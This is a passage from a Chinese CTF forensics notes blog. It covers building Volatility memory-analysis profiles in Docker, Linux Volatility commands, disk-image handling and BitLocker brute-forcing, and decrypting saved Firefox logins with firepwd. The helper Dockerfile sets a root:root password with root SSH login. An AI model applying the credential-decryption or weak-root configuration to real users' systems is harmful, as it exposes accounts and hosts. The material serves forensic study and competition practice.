<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --tag profile .</span><br><span class="line">docker run -p 2022:22  -it profile /bin/sh</span><br></pre></td></tr></table></figure>
<p>SSH连接容器映射出来的端口，将 dwarf 文件复制出来，然后和之前的 systemmap 文件一起打包为 Debian_5.10.0-21-amd64_profile.zip</p>
<p>最后将这个 zip 文件放到 ~/volatility/volatility/plugins/overlays/linux/ 路径下即可</p>
<p>使用 <a class="link"   target="_blank" rel="noopener" href="http://vol.py" >vol.py<i class="fas fa-external-link-alt"></i></a> --info | grep Profile | grep Linux 命令查看 profile 是否成功加载</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/profile1.png"
                        alt=""
                 ></p>
<h5 id="制作-symbols-Vol3-的详细过程">制作  symbols(Vol3)  的详细过程</h5>
<p><strong>识别内存镜像的系统版本</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mem | grep -i <span class="string">&#x27;Linux version&#x27;</span> | <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux version 5.4.0-100-generic (buildd@lcy02-amd64-002) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) </span><br><span class="line"><span class="comment"># 113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 (Ubuntu 5.4.0-100.113-generic 5.4.166)</span></span><br></pre></td></tr></table></figure>
<p>然后要找到和这个系统版本一模一样的内核，注意一定要一模一样</p>
<p>内核文件类似于下面这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux-image-unsigned-5.4.0-100-generic-dbgsym_5.4.0-100.113_amd64.ddeb</span><br></pre></td></tr></table></figure>
<p>Ubuntu的内核可以去这个网站上找：<a class="link"   target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/+source/linux/5.4.0-100.113" >https://launchpad.net/ubuntu/+source/linux/5.4.0-100.113<i class="fas fa-external-link-alt"></i></a></p>
<p>找到内核文件之后的操作可以使用Lunatic师傅写的 <a class="link"   target="_blank" rel="noopener" href="https://github.com/goodlunatic/Docker-SymbolsMaker-vol3" >Dockerfile<i class="fas fa-external-link-alt"></i></a> 辅助完成</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将环境设置为非交互环境</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/ /src/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/security.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; apt update --no-install-recommends\</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y openssh-server gcc-10 dwarfdump build-essential unzip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> /app \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/\#PermitRootLogin prohibit-password/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/\#PasswordAuthentication yes/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;root:root&#x27;</span> | chpasswd \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; systemctl <span class="built_in">enable</span> ssh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; service ssh start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的文件名需要根据系统版本进行修改</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/linux-image-unsigned-5.4.0-100-generic-dbgsym_5.4.0-100.113_amd64.ddeb linux-image-unsigned-5.4.0-100-generic-dbgsym_5.4.0-100.113_amd64.ddeb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg -i linux-image-unsigned-5.4.0-100-generic-dbgsym_5.4.0-100.113_amd64.ddeb \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> +x dwarf2json \</span></span><br><span class="line"><span class="language-bash">    <span class="comment"># 下面这里的文件名需要根据系统版本进行修改</span></span></span><br><span class="line">    &amp;&amp; ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-<span class="number">5.4</span>.<span class="number">0</span>-<span class="number">100</span>-generic &gt; linux-image-<span class="number">5.4</span>.<span class="number">0</span>-<span class="number">100</span>-generic.json</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --tag profile .</span><br><span class="line">docker run -p 2022:22  -it profile /bin/sh</span><br></pre></td></tr></table></figure>
<p>SSH连接容器映射出来的端口，然后将json文件放到 volatility3/volatility3/framework/symbols/linux/ 目录下即可</p>
<h5 id="Volatility2-2">Volatility2</h5>
<p><strong><a class="link"   target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference" >官方文档<i class="fas fa-external-link-alt"></i></a></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看Profile是否载入成功</span></span><br><span class="line">vol.py --info | grep Profile | grep Linux</span><br><span class="line"><span class="comment"># 查看内核和发行版信息</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_banner</span><br><span class="line"><span class="comment"># 查看命令行记录</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_bash</span><br><span class="line"><span class="comment"># 查看桌面上的文件</span></span><br><span class="line">vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-100-amd64_profilex64 linux_find_file -L | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line"><span class="comment"># 提取文件</span></span><br><span class="line">vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-100-amd64_profilex64 linux_find_file -i 0xffff9ce28fe300e8 -O</span><br><span class="line"><span class="comment"># 恢复文件系统</span></span><br><span class="line"><span class="built_in">sudo</span> python2 ~/volatility/vol.py -f mem --profile=LinuxUbuntu_5_4_0-100-amd64_profilex64 linux_recover_filesystem --dump-dir=./</span><br><span class="line"><span class="comment"># 查看进程</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_pslist</span><br><span class="line"><span class="comment"># 查看进程打开的文件</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_lsof</span><br><span class="line"><span class="comment"># 查看正在运行的进程</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_psaux</span><br><span class="line"><span class="comment"># 查看网络状态</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_netstat</span><br><span class="line"><span class="comment"># 查看挂载了哪些文件系统</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_mount</span><br><span class="line"><span class="comment"># 查看已加载的内核模块</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_lsmod</span><br><span class="line"><span class="comment"># 查看隐藏的内核模块</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_hidden_modules</span><br><span class="line"><span class="comment"># 查看可疑的进程</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_malfind</span><br><span class="line"><span class="comment"># 恢复Truecrypt密钥(需要yara模块，然后使用上可能有点问题)</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_truecrypt_passphrase</span><br><span class="line"><span class="comment"># 在内存转储中打开一个shell</span></span><br><span class="line">vol.py -f mem --profile=LinuxDebian_5_10_0-21-amd64_profilex64 linux_volshell -v</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class="keyword">in</span> vtypes</span><br><span class="line">WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class="keyword">in</span> vtypes</span><br><span class="line">Current context: process systemd, pid=1 DTB=0x2080000</span><br><span class="line">Welcome to volshell! Current memory image is:</span><br><span class="line">file:///mnt/c/Users/GoodLunatic/Desktop/1/mem</span><br><span class="line">To get <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&#x27;hh()&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hh()</span><br><span class="line"></span><br><span class="line">Use addrspace() <span class="keyword">for</span> Kernel/Virtual AS</span><br><span class="line">Use addrspace().base <span class="keyword">for</span> Physical AS</span><br><span class="line">Use proc() to get the current process object</span><br><span class="line">  and proc().get_process_address_space() <span class="keyword">for</span> the current process AS</span><br><span class="line">  and proc().get_load_modules() <span class="keyword">for</span> the current process DLLs</span><br><span class="line"></span><br><span class="line">addrspace()                              : Get the current kernel/virtual address space.</span><br><span class="line">cc(offset=None, pid=None, name=None, physical=False) : Change current shell context.</span><br><span class="line">db(address, length=128, space=None)      : Print bytes as canonical hexdump.</span><br><span class="line"><span class="built_in">dd</span>(address, length=128, space=None)      : Print dwords at address.</span><br><span class="line">dis(address, length=128, space=None, mode=None) : Disassemble code at a given address.</span><br><span class="line">dq(address, length=128, space=None)      : Print qwords at address.</span><br><span class="line">dt(objct, address=None, space=None, recursive=False, depth=0) : Describe an object or show <span class="built_in">type</span> info.</span><br><span class="line">find(needle, max=1, <span class="built_in">shift</span>=0, skip=0, count=False, length=128) :</span><br><span class="line">getmods()                                : Generator <span class="keyword">for</span> kernel modules (scripting).</span><br><span class="line">getprocs()                               : Generator of process objects (scripting).</span><br><span class="line">hh(cmd=None)                             : Get <span class="built_in">help</span> on a <span class="built_in">command</span>.</span><br><span class="line">list_entry(<span class="built_in">head</span>, objname, offset=-1, fieldname=None, forward=True, space=None) : Traverse a _LIST_ENTRY.</span><br><span class="line">modules()                                : Print loaded modules <span class="keyword">in</span> a table view.</span><br><span class="line">proc()                                   : Get the current process object.</span><br><span class="line">ps()                                     : Print active processes <span class="keyword">in</span> a table view.</span><br><span class="line">sc()                                     : Show the current context.</span><br><span class="line">For <span class="built_in">help</span> on a specific <span class="built_in">command</span>, <span class="built_in">type</span> <span class="string">&#x27;hh(&lt;command&gt;)&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="Volatility3-2">Volatility3</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前都有哪些 Profile 可用</span></span><br><span class="line">vol3.py IsfInfo | grep linux</span><br><span class="line"><span class="comment"># 查看bash历史记录</span></span><br><span class="line">vol3.py -f 1.mem linux.bash</span><br><span class="line"><span class="comment"># 扫描进程</span></span><br><span class="line">vol3.py -f 1.mem linux.pslist</span><br><span class="line"><span class="comment"># 列出子进程</span></span><br><span class="line">vol3.py -f 1.mem linux.pstree</span><br><span class="line"><span class="comment"># 扫描文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">linux.bash.Bash     Recovers bash command history from memory.</span><br><span class="line">linux.capabilities.Capabilities</span><br><span class="line">                    Lists process capabilities</span><br><span class="line">linux.check_afinfo.Check_afinfo</span><br><span class="line">                    Verifies the operation function pointers of network protocols.</span><br><span class="line">linux.check_creds.Check_creds</span><br><span class="line">                    Checks if any processes are sharing credential structures</span><br><span class="line">linux.check_idt.Check_idt</span><br><span class="line">                    Checks if the IDT has been altered</span><br><span class="line">linux.check_modules.Check_modules</span><br><span class="line">                    Compares module list to sysfs info, if available</span><br><span class="line">linux.check_syscall.Check_syscall</span><br><span class="line">                    Check system call table for hooks.</span><br><span class="line">linux.elfs.Elfs     Lists all memory mapped ELF files for all processes.</span><br><span class="line">linux.envars.Envars</span><br><span class="line">linux.envvars.Envvars</span><br><span class="line">                    Lists processes with their environment variables</span><br><span class="line">linux.iomem.IOMem   Generates an output similar to /proc/iomem on a running system.</span><br><span class="line">linux.keyboard_notifiers.Keyboard_notifiers</span><br><span class="line">                    Parses the keyboard notifier call chain</span><br><span class="line">linux.kmsg.Kmsg     Kernel log buffer reader</span><br><span class="line">linux.lsmod.Lsmod   Lists loaded kernel modules.</span><br><span class="line">linux.lsof.Lsof     Lists all memory maps for all processes.</span><br><span class="line">linux.malfind.Malfind</span><br><span class="line">                    Lists process memory ranges that potentially contain injected code.</span><br><span class="line">linux.mountinfo.MountInfo</span><br><span class="line">                    Lists mount points on processes mount namespaces</span><br><span class="line">linux.proc.Maps     Lists all memory maps for all processes.</span><br><span class="line">linux.psaux.PsAux   Lists processes with their command line arguments</span><br><span class="line">linux.pslist.PsList</span><br><span class="line">                    Lists the processes present in a particular linux memory image.</span><br><span class="line">linux.psscan.PsScan</span><br><span class="line">                    Scans for processes present in a particular linux image.</span><br><span class="line">linux.pstree.PsTree</span><br><span class="line">                    Plugin for listing processes in a tree based on their parent process ID.</span><br><span class="line">linux.sockstat.Sockstat</span><br><span class="line">                    Lists all network connections for all processes.</span><br><span class="line">linux.tty_check.tty_check</span><br><span class="line">                    Checks tty devices for hooks</span><br></pre></td></tr></table></figure>
<h4 id="MacOS内存取证">MacOS内存取证</h4>
<h5 id="Volatility2-3">Volatility2</h5>
<h5 id="Volatility3-3">Volatility3</h5>
<h5 id="识别不出内存镜像版本的取证">识别不出内存镜像版本的取证</h5>
<p>直接使用 010 手搓或者用 Strings 命令把可打印字符保存到文本文件中再手搓</p>
<p>需要从内存中找到 AES 解密的 key 的情况：可以使用 findaes.exe 工具辅助查找</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/findaes.png"
                        alt=""
                 ></p>
<h4 id="用来制作内存镜像的工具">用来制作内存镜像的工具</h4>
<p>1、Volatility<br>
2、FTK Imager<br>
3、Magnet RAM Capture<br>
4、Belkasoft Live RAM Capturer<br>
5、WinPMEM<br>
6、Rekall<br>
7、DumpIt<br>
8、OSForensics</p>
<h4 id="dmp文件">dmp文件</h4>
<p>1、拉入Passware Kit Forensic-Memory Analysis进行分析（用户名和密码）</p>
<p>2、使用vol分析</p>
<h4 id="dump文件">dump文件</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;dmp&quot; 通常特指 Windows 的崩溃转储文件，而 &quot;dump&quot; 是一个更为通用的术语，可以用于描述各种数据转储操作或文件。</span><br></pre></td></tr></table></figure>
<p>取证方法大致和dmp文件相同</p>
<h4 id="mem文件">mem文件</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f mem imageinfo</span><br></pre></td></tr></table></figure>
<h4 id="raw文件">raw文件</h4>
<p>可以直接使用 vol2 或者 vol3 进行内存取证</p>
<h3 id="磁盘取证">磁盘取证</h3>
<p>Tips：1、同一个镜像文件，不同的密码可以挂载出不同的盘，里面的数据也不同</p>
<h4 id="VeraCrypt">VeraCrypt</h4>
<p>解密&amp;挂载磁盘的步骤：</p>
<p>1.选择要挂载的加密盘，然后选择一个没有被占用的盘符再点击左下角的加载</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VeraCrypt1-17142941155649.png"
                        alt=""
                 ></p>
<p>2.输入加密盘的密钥，或者直接使用密钥文件(图片文件也可以)</p>
<p>​	如果这里加载失败，可以点击下面的加密卷工具，把密钥给改了，然后使用自己更改后的密钥挂载</p>
<h4 id="取证大师">取证大师</h4>
<p>没啥好说的，直接把硬盘镜像文件拉进去梭就行</p>
<h4 id="fat文件">fat文件</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAT格式： 即FAT16,这是MS－DOS和最早期的Win 95操作系统中最常见的磁盘分区格式。它采用16位的文件分配表，能支持最大为2GB的分区，几乎所有的操作系统都支持这一种格式。</span><br></pre></td></tr></table></figure>
<p>1、可以使用veracrypt挂载到本地，然后用资源管理器打开</p>
<p>2、如果挂载后资源管理器打不开，可以使用winhex-工具-打开磁盘查看</p>
<h4 id="VMDK文件">VMDK文件</h4>
<p>可以用Imdisk挂载到本地</p>
<p>1、可以使用Diskgenius-磁盘-打开虚拟磁盘文件</p>
<p>2、可以使用Imdisk挂载到本地，然后用everything进行搜索</p>
<p>3、可以使用7zip打开然后解压缩</p>
<p>4、可以使用FTK、Vera挂载</p>
<h4 id="E01文件">E01文件</h4>
<p>1、若有BitLocker加密并提供了内存镜像，就拉入Passware Kit Forensic-Decrypt Disk-BitLocker进行爆破解密</p>
<p>​	  解密后会得到一个G-decrypted.dd，然后用 FTK image 打开</p>
<p>2、提供的 E01 文件可能有好几部分，BitLocker加密的密钥可能藏在其中一部分中，建议用 FTK image 查看一下</p>
<p>​	  FTK image 直接提取文件可能会有点问题（加密压缩包、根目录文件看不到），建议还是直接 mount 到本地然后再提取</p>
<p>3、高版本FTK报错可以试试低版本，4.2比较稳定</p>
<h4 id="ad1文件">ad1文件</h4>
<p>ad1文件是用 FTKimage 制作的磁盘镜像，因此可以使用 FTKimage 进行挂载</p>
<h4 id="VHD文件">VHD文件</h4>
<p>vhd 是 Virtual Hard Disk 虚拟磁盘的缩写，是一种用于存储虚拟机磁盘镜像的文件格式</p>
<p>可以在 Windows 系统下直接挂载，也可以拉入 DiskGenius  打开查看</p>
<p>如果有<code>Bitlocker</code>可以使用<code>x-way</code>提取一个<code>.dd</code>文件再进行爆破，新版本的<code>Elcomsoft Forensic Disk Decryptor</code>支持<code>.vhd</code>格式直接解<code>Bitlocker </code></p>
<h4 id="磁盘取证的一些思路">磁盘取证的一些思路</h4>
<h5 id="查看Powershell的历史记录">查看Powershell的历史记录</h5>
<p>用户的powershell历史记录会保存在这个路径下<br>
\Users\test\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
<h5 id="仿真取证">仿真取证</h5>
<p>使用FTK Imager + VMware就行，Hyper-V的兼容性问题还有待考证</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ldsweely/p/18137563" >【电子取证：镜像仿真篇】DD、E01系统镜像动态仿真 - ldsweely - 博客园<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>步骤：</strong></p>
<ol>
<li>以管理员形式打开vm</li>
<li>新建虚拟机</li>
<li>自定义</li>
<li>稍后安装</li>
<li>选择你的系统</li>
<li>选择安装位置</li>
<li>BIOS</li>
<li>自己分配处理器和内存（如果有时候蓝屏则调高内存或许可行</li>
<li>默认（NAT）</li>
<li>默认（推荐）</li>
<li>SATA</li>
<li>使用物理磁盘</li>
<li>设备选择刚刚挂载的PhysicalDrive</li>
<li>下一步</li>
</ol>
<h3 id="网站取证">网站取证</h3>
<p>1、直接拿D_safe扫描可疑文件</p>
<h3 id="服务器取证">服务器取证</h3>
<p>硬盘镜像文件后缀: .qcow2</p>
<h4 id="Mysql5-7-数据库从qp-xb文件恢复数据">Mysql5.7 数据库从qp.xb文件恢复数据</h4>
<p>需要安装并使用qpress和xtrabackup</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/attach/183466/cn_zh/1608011575185/qpress-11-linux-x64.tar&quot;</span></span><br><span class="line">wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 775 qpress</span><br><span class="line"><span class="built_in">cp</span> qpress /usr/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> filename.xb | xbstream -x -v -C /www/server/data</span><br><span class="line"><span class="built_in">cd</span> /www/server/data</span><br><span class="line">innobackupex --decompress --remove-original /www/server/data </span><br><span class="line"><span class="comment">#下一步可能会报错，但是不影响</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --apply-log /www/server/data</span><br><span class="line"><span class="comment"># 修改该目录所属的用户和用户组</span></span><br><span class="line"><span class="built_in">chown</span> -R mysql:mysql /www/server/data</span><br></pre></td></tr></table></figure>
<h4 id="其他">其他</h4>
<h5 id="1、磁盘恢复">1、磁盘恢复</h5>
<p>拉到 kali 中用 extundelete</p>
<p>extundelete --restore-all disk-image</p>
<p>之后在所在目录会生成一个恢复文件</p>
<h5 id="2、浏览器登录凭证破解">2、浏览器登录凭证破解</h5>
<p>Firefox登录凭证破解</p>
<p>使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd" >Firepwd工具<i class="fas fa-external-link-alt"></i></a>破解，将key4.db、logins.json复制到firepwd目录下，用firepwd.py破解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python firepwd.py logins.json</span><br></pre></td></tr></table></figure>
<h3 id="其他题目">其他题目</h3>
<h4 id="FAS文件">FAS文件</h4>
<p>AutoCAD插件的一个中间文件格式，可以反编译（2024 赣育杯）</p>
<p><a class="link"   target="_blank" rel="noopener" href="http://bbs.mjtd.com/thread-178148-1-1.html" >fas文件格式研究 - AutoLISP/Visual LISP 编程技术 - AutoCAD论坛 - 明经CAD社区 - Powered by Discuz!<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Hopfengetraenk/Fas-Disasm" >Hopfengetraenk/Fas-Disasm: Fas-Disassembler/Decompiler for AutoCAD Visual Lisp<i class="fas fa-external-link-alt"></i></a></p>
<!-- flag of hidden posts -->
                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Misc/">Misc</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">评论插件加载失败</span>
    <button class="reload keep-button">点击重新加载</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">正在加载评论插件</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="waline-comment-container">
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
        <div id="waline-comment"></div>
        <script data-pjax>
          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
        </script>

        

        
            <script 
                    async
                    type="module"
            >
              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
              window.KeepCommentPlugin.initWaline = () => {
                if (init) {
                  init(window.KeepCommentPlugin.walineOptions)
                  window.KeepCommentPlugin.hideLoading()
                } else {
                  setTimeout(() => {
                    window.KeepCommentPlugin.initWaline()
                  }, 1000)
                }
              }

              if ('false' === 'true') {
                setTimeout(() => {
                  window.KeepCommentPlugin.initWaline()
                }, 1200)
              } else {
                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
              }
            </script>
        
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
